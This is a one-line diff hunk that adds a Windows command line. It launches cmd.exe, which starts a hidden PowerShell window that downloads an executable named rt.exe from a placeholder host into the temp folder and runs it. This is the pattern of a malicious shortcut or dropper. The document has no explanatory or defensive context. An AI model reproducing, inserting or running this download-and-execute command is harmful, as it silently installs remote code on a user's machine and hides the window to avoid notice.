@@ -1,0 +1,1 @@
+C:\Windows\System32\cmd.exe /c start /min powershell -w hidden -c "iwr 'http://lnk-3.example.test/rt.exe' -o $env:TEMP\s.exe; start $env:TEMP\s.exe"
